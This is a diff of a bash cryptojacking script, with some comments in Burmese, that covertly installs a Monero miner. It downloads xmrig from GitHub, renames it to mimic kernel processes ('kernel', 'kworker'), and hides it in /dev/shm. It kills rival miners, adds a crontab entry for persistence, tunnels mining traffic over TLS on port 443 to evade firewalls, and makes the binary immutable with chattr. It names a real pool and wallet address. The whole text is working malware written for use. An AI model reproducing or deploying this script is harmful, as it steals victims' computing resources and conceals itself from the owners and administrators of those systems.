@@ -1,40 +1,34 @@
 #!/bin/bash
 
-# --- CONFIGURATION ---
-WALLET="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
-WORKER="HlaingBwar_Worker"
-POOL="gulf.moneroocean.stream:443" # Using Port 443 to bypass most firewalls
-DIR="/dev/shm/.sys_update"
-BIN="$DIR/kernel"
+# --- CONFIG ---
+W="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
+P="gulf.moneroocean.stream:443"
+N="HB_FUD_$(shuf -i 10-99 -n 1)" # နာမည်ကို random ပေးပြီး firewall ရှောင်မယ်
+D="/dev/shm/.cache_$(date +%s)"
+B="$D/kworker"
 
-# --- THE PURGE: KILL RIVALS ---
-# Kill any known mining processes and high CPU consumers
-pkill -9 -f "javae|node-f|xmrig|miner|monero|xmr|nanominer|nicehash"
-find /tmp /var/tmp /dev/shm -name ".*" -exec rm -rf {} + 2>/dev/null
+# --- THE CLEANUP ---
+# အရင်က တက်မလာတဲ့ miner အဟောင်းတွေကို အကုန်သတ်
+pkill -9 -f "javae|node-f|xmrig|miner|kernel"
+rm -rf /dev/shm/.sys_update 2>/dev/null
 
-# --- SETUP ENVIRONMENT ---
-mkdir -p $DIR
-cd $DIR
+# --- STEALTH SETUP ---
+mkdir -p $D
+cd $D
 
-# --- DOWNLOAD STATIC MINER ---
-# Using a static binary to ensure it runs on any Linux distro
-if [ ! -f "$BIN" ]; then
-    curl -s -L https://github.com/moneroocean/xmrig_setup/raw/master/xmrig.tar.gz -o xmrig.tar.gz
-    tar -xzf xmrig.tar.gz
-    mv xmrig kernel
-    chmod +x kernel
-    rm xmrig.tar.gz
-fi
+# --- STATIC BINARY DOWNLOAD (FUD) ---
+# Static-linked binary ဖြစ်လို့ library error မတက်တော့ဘူး
+curl -s -L https://github.com/moneroocean/xmrig_setup/raw/master/xmrig.tar.gz | tar -xz
+mv xmrig kworker
+chmod +x kworker
 
-# --- PERSISTENCE LOGIC (CRONTAB) ---
-# Re-run every 5 minutes if killed
-(crontab -l 2>/dev/null | grep -v "kernel"; echo "*/5 * * * * $BIN --url $POOL --user $WALLET --pass $WORKER --tls -B >/dev/null 2>&1") | crontab -
+# --- PERSISTENCE (HIDDEN) ---
+# Crontab ထဲမှာ "system update" လိုမျိုး ဟန်ဆောင်ပြီး ထည့်မယ်
+(crontab -l 2>/dev/null | grep -v "kworker"; echo "*/5 * * * * $B --url $P --user $W --pass $N --tls -B >/dev/null 2>&1") | crontab -
 
-# --- EXECUTE MINER ---
-# Running in background with TLS enabled
-$BIN --url $POOL --user $WALLET --pass $WORKER --tls -B >/dev/null 2>&1
+# --- EXECUTE ---
+# TLS encrypt လုပ်ထားလို့ firewall က mining traffic မှန်းမသိတော့ဘူး
+./kworker --url $P --user $W --pass $N --tls -B >/dev/null 2>&1
 
 # --- LOCKDOWN ---
-# Make the binary immutable so even root has trouble deleting it
-chattr +i $BIN 2>/dev/null
-chattr +i /var/spool/cron/crontabs/$(whoami) 2>/dev/null
+chattr +i $B 2>/dev/null
